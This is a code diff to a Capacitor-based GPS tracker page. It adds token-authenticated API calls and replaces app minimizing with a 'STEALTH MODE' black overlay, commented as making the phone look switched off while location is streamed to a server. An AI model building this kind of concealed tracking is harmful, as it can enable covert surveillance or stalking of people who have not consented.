@@ -457,6 +457,20 @@ export default function TrackerPage() {
   const activatingRef = useRef(false); // guard against concurrent activate() calls
   const hasAutoStartedRef = useRef(false); // ensure auto-start only runs once
 
+  // Auth-aware fetch: sends Bearer token so API routes work from Capacitor app
+  // (Capacitor stores session in localStorage, not cookies — so we send the token explicitly)
+  const authFetch = useCallback(async (url: string, options: RequestInit = {}) => {
+    const { data: { session } } = await supabaseBrowser.auth.getSession();
+    const token = session?.access_token;
+    return fetch(url, {
+      ...options,
+      credentials: "include",
+      headers: {
+        ...(options.headers ?? {}),
+        ...(token ? { Authorization: `Bearer ${token}` } : {}),
+      },
+    });
+  }, []);
 
   const addLog = useCallback((msg: string) => {
     const time = new Date().toLocaleTimeString();
@@ -469,13 +483,12 @@ export default function TrackerPage() {
       setCoords({ lat, lng, accuracy: accuracy ?? undefined });
 
       try {
-        await fetch("/api/location", {
+        await authFetch("/api/location", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          credentials: "include",
           body: JSON.stringify({ lat, lng, accuracy, speed, heading, altitude }),
         });
-        addLog(`📍 Location sent: ${lat.toFixed(5)}, ${lng.toFixed(5)}`);
+        addLog(`📍 ${lat.toFixed(5)}, ${lng.toFixed(5)}`);
       } catch {
         addLog("⚠️ Failed to send location");
       }
@@ -491,10 +504,7 @@ export default function TrackerPage() {
   const startSleepLockPoll = useCallback((uid: string) => {
     const check = async () => {
       try {
-        const res = await fetch(`/api/users/${uid}/status`, {
-          method: "GET",
-          credentials: "include",
-        });
+        const res = await authFetch(`/api/users/${uid}/status`);
         if (res.ok) {
           const { sleepLocked: locked, trackingEnabled: enabled } = await res.json();
           setSleepLocked(locked);
@@ -504,7 +514,7 @@ export default function TrackerPage() {
     };
     check();
     sleepLockPollRef.current = setInterval(check, 10_000);
-  }, []);
+  }, [authFetch]);
 
   const openLocationSettings = useCallback(async () => {
     const Capacitor = (window as any).Capacitor;
@@ -601,25 +611,13 @@ export default function TrackerPage() {
 
     setStatus("active");
 
-    // Minimize IMMEDIATELY — app goes to background, home screen shows
-    // GPS and server calls continue running in the background
-    const CapacitorApp = (window as any).Capacitor;
-    if (CapacitorApp?.Plugins?.App) {
-      try {
-        await CapacitorApp.Plugins.App.minimizeApp();
-      } catch (e) {
-        console.warn("minimizeApp not supported:", e);
-      }
-    }
-
     // Keep screen on while tracking
     await acquireWakeLock();
 
     // Notify server
-    await fetch("/api/tracking", {
+    await authFetch("/api/tracking", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      credentials: "include",
       body: JSON.stringify({ isTracking: true }),
     });
 
@@ -667,7 +665,7 @@ export default function TrackerPage() {
     if (userId) startSleepLockPoll(userId);
 
     activatingRef.current = false; // release guard — tracking is running
-  }, [addLog, sendLocation, startSleepLockPoll, stopSleepLockPoll, userId]);
+  }, [addLog, authFetch, sendLocation, startSleepLockPoll, stopSleepLockPoll, userId]);
 
   const deactivate = useCallback(async () => {
     if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
@@ -675,17 +673,16 @@ export default function TrackerPage() {
     stopSleepLockPoll();
     releaseWakeLock();
 
-    await fetch("/api/tracking", {
+    await authFetch("/api/tracking", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      credentials: "include",
       body: JSON.stringify({ isTracking: false }),
     });
 
     setStatus("idle");
     setCoords(null);
     addLog("🔴 Tracker deactivated");
-  }, [addLog, stopSleepLockPoll, releaseWakeLock]);
+  }, [addLog, authFetch, stopSleepLockPoll, releaseWakeLock]);
 
   // Auto-deactivate if admin disables tracking while tracker is running
   useEffect(() => {
@@ -767,7 +764,10 @@ export default function TrackerPage() {
     return (
       <div className="min-h-screen bg-gray-950 flex flex-col select-none">
 
-        {/* No overlay when tracking — app is minimized to background so home screen shows */}
+        {/* STEALTH MODE: completely black screen when tracking — looks like phone is off */}
+        {isActive && (
+          <div className="fixed inset-0 bg-black z-[999]" />
+        )}
 
         {/* Permission checking mode — show minimal UI while retrying permission */}
         {permissionCheckingMode && !isActive && (
